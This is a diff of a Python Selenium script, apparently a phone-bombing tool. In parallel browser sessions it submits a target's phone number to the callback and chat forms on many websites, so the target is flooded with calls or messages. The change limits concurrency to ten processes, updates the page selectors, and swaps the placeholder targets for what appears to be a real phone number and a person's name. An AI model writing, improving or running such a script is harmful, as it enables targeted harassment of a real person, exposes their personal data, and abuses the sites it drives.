@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-from multiprocessing import Process, Queue
+from multiprocessing import Process, Queue, BoundedSemaphore
 import time
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
@@ -10,41 +10,42 @@ from selenium import webdriver
 from selenium.webdriver.common.by import By
 
 
-def visit_website(url, i, queue,phone):
-    try:
-        driver = webdriver.Chrome()
-        driver.get("https://www.baidu.com/")
-        driver.get(url)
-
+def visit_website(url, i, queue,phone,semaphore):
+    with semaphore:
         try:
-            # 等待弹窗出现并点击关闭按钮
-            WebDriverWait(driver, 10).until(
-                EC.presence_of_element_located((By.CLASS_NAME, "imlp-component-captcha-close"))).click()
-        except:
-            # 如果弹窗没有出现，就什么都不做
-            pass
-        time.sleep(30)
-        handles = driver.window_handles
-        driver.switch_to.window(handles[-1])
+            driver = webdriver.Chrome()
+            driver.get("https://www.baidu.com/")
+            driver.get(url)
 
-        # driver.find_element(By.CLASS_NAME, 'pc-icon-leave-tel').click()
-        # time.sleep(3)
-        # driver.find_element(By.CLASS_NAME, 'leavetel-input').send_keys(phone)
-        # time.sleep(3)
-        # driver.find_element(By.CLASS_NAME, 'leavetel-callback').click()
-        WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.CSS_SELECTOR, '.pc-icon-leave-tel'))).click()
-        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CLASS_NAME, 'leavetel-input'))).send_keys(phone)
-        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CLASS_NAME, 'leavetel-callback'))).click()
+            try:
+                # 等待弹窗出现并点击关闭按钮
+                WebDriverWait(driver, 10).until(
+                    EC.presence_of_element_located((By.CLASS_NAME, "imlp-component-captcha-close"))).click()
+            except:
+                # 如果弹窗没有出现，就什么都不做
+                pass
+            time.sleep(30)
+            handles = driver.window_handles
+            driver.switch_to.window(handles[-1])
 
-        time.sleep(1)
-        driver.quit()
+            # driver.find_element(By.CLASS_NAME, 'pc-icon-leave-tel').click()
+            # time.sleep(3)
+            # driver.find_element(By.CLASS_NAME, 'leavetel-input').send_keys(phone)
+            # time.sleep(3)
+            # driver.find_element(By.CLASS_NAME, 'leavetel-callback').click()
+            WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.CSS_SELECTOR, '.pc-imlp-component-typebox-input'))).click()
+            WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CLASS_NAME, 'pc-imlp-component-typebox-input'))).send_keys(phone)
+            WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CLASS_NAME, 'pc-imlp-component-typebox-send'))).click()
 
-        # 将执行结果添加到共享列表
-        queue.put((i, True))
+            time.sleep(1)
+            driver.quit()
 
-    except Exception as exc:
-        # 如果发生错误，将执行结果添加到共享列表
-        queue.put((i, False))
+            # 将执行结果添加到共享列表
+            queue.put((i, True))
+
+        except Exception as exc:
+            # 如果发生错误，将执行结果添加到共享列表
+            queue.put((i, False))
 
 
 def boom(phone):
@@ -56,9 +57,10 @@ def boom(phone):
 
     processes = []
     queue = Queue()
+    semaphore = BoundedSemaphore(10)
     # 遍历链接地址
     for i, url in enumerate(urls):
-        processes.append(Process(target=visit_website, args=(url.strip(), i, queue,phone)))
+        processes.append(Process(target=visit_website, args=(url.strip(), i, queue,phone,semaphore)))
     # 启动所有线程
     for p in processes:
         p.start()
@@ -77,6 +79,6 @@ def boom(phone):
 # 程序主入口
 if __name__ == "__main__":
     # get_cookie()
-    boom("phone1")
-    boom("phone2")
+    boom("17357921966 刘胜")
+    # boom("phone2")
 
